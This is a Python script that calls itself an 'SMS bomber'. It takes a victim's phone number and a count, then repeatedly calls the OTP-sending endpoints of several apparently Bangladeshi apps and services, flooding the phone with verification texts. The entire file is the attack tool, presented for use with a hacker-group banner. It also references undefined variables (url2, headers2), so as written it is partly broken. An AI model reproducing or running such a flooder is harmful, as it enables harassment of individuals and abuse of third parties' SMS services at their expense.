import sys,os
import requests
from requests.structures import CaseInsensitiveDict

blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
black="\033[0;30m"
pink="\x1b[95m"
blue="\x1b[94m"
underline='\x1b[4m'
colouroff="\x1b[00m"
os.system('clear')
r=requests.get('https://pastebin.com/raw/Ga6ej4mA').text
r1=str(r)
logu=(pink+f"""
\t  ____      _   _      ____
\t / ___|    | | | |    | __ )
\t| |        | |_| |    |  _ \    """+colouroff+underline+"""CYBER HUNTER BD"""+colouroff+pink+"""
\t| |___     |  _  |    | |_) |
\t \____|    |_| |_|    |____/ 
\n"""+blue+"""           Focous on Your Aim, You Will winner""")


line=end+"\n__________________________________________________________"
def ccc():
	print(logu+"\n\n	"+green+"   Developed By : MD ALAMIN CHOWDORY"+green+"\n\n 	"+red+"   Version :"+r1+"\n\n            "+line)

ccc()

number=str(input(red+"[➙] Enter Your Number [>]"))
amount=int(input(cyan+"[➙] Enter The Amount [>]"))

url1 = "https://ss.binge.buzz/otp/send/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone=0"+number






url3 = "https://stage.bioscopelive.com/en/login/send-otp?phone=880"+number+"&operator=bd-otp"

url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"

data4 = '{\"mobile\":\"0'+number+'\"}'

url5 = "https://addabaji.mobi/twocups-v1-robi/otp.php"

headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/x-www-form-urlencoded"

data5 = "msisdn=0"+number

url6 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
headers6 = CaseInsensitiveDict()
headers6["Content-Type"] = "application/json"

data6 = '{"phone":"0'+number+'","country_code":"+880","fcm_token":null}'
import requests



url12 = "https://api-v4-1.hungrynaki.com/graphql"

data12 = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': number, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}




for i in range (amount):
        resp = requests.post(url12, json=data12)

        resp1 = requests.post(url1, headers=headers1, data=data1)
        resp2 = requests.post(url2, headers=headers2)
        resp3 = requests.get(url3)
        resp4 = requests.post(url4, headers=headers4,data=data4)
        resp5 = requests.post(url5, headers=headers5, data=data5)
        resp = requests.post(url6, headers=headers6, data=data6)
        resp = requests.post(url12, json=data12)
        resp = requests.post(url12, json=data12)

        resp1 = requests.post(url1, headers=headers1, data=data1)
        resp2 = requests.post(url2, headers=headers2)
        resp3 = requests.get(url3)
        resp4 = requests.post(url4, headers=headers4,data=data4)
        resp5 = requests.post(url5, headers=headers5, data=data5)
        resp = requests.post(url6, headers=headers6, data=data6)
        resp = requests.post(url12, json=data12)
        print(str(i+3)+green+'. ➙Success Sms  Sand ⏳⌛')


print(cyan+'\t\tThanks For Using CHB  SMS BOMBER  ')
a=input()
os.system("Clear")